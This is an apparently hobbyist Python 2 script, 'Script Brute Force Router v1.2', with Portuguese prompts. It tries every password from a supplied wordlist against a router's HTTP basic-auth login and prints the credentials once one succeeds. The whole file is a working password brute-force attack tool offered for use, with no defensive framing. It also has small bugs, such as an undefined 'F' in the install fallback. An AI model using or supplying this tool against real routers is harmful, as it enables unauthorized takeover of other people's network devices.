# -*- coding: utf-8 -*-

import sys
import os
import argparse
import time
import requests

RED = '\033[1;31m'
BLUE = '\033[94m'
BOLD = '\033[1m'
GREEN = '\033[32m'
OTRO = '\033[36m'
YELLOW = '\033[33m'
ENDC = '\033[0m'

try:
	import requests
except:
	install = F.RED + raw_input('Opss, parece que você não tem o módulo (requests)\n deseja instalar (y/n)? ')
	if(install == 'y'):
		os.system('pip install requests')
	else:
		print F.BLUE + '\nBye'
		sys.exit()

parser = argparse.ArgumentParser(description='Coded by: RNX')
parser.add_argument('--target', '-t', help='Ip do roteador', action='store')
parser.add_argument('--login', '-l', help='Login do roteador', action='store')
parser.add_argument('--passfile', '-p', help='Sua wordlist', action='store')
argumentos = parser.parse_args()

wordlist = argumentos.passfile
url = 'http://' + str(argumentos.target)
login = argumentos.login

def banner():
	logo = ENDC + str('''
	    *******************************************
	    *    [!] Script Brute Force Router v1.2   *
            *******************************************
	                  Coded by: RNX
	''')
	print logo

def help():
	ajuda = ENDC + str('''
	Use: python brute_r0ut3r.py -t <ip> -l <login> -p <wordlist>
	''')
	print ajuda

def main():
	global wordlist
	global url
	global login

	passlist = []
	os.system('cls' if(os.name == 'nt') else 'reset')
	banner()
	
	if(len(sys.argv) < 3):
		help()
		sys.exit()

	try:
		with open(wordlist, 'r') as password:
			password1 = password.readlines()

			for password_1 in password1:
				passlist.append(password_1.rstrip())
	except IOError:
		print RED + '[-] Wordlist not found!'
		sys.exit()
	print RED + str('Cracking...\n')
	
	for password in passlist:
		envia_request = requests.get(url, auth=(login, password))
		code = envia_request.status_code
		if( code == 200 ):
                    print RED + str('++ Password cracked ++\n\nLogin: {}\nPassword: {}').format(login, password)
		    sys.exit()

		else:
			pass


	print RED + 'Password not found !!!'

if(__name__ == '__main__'):
	main()
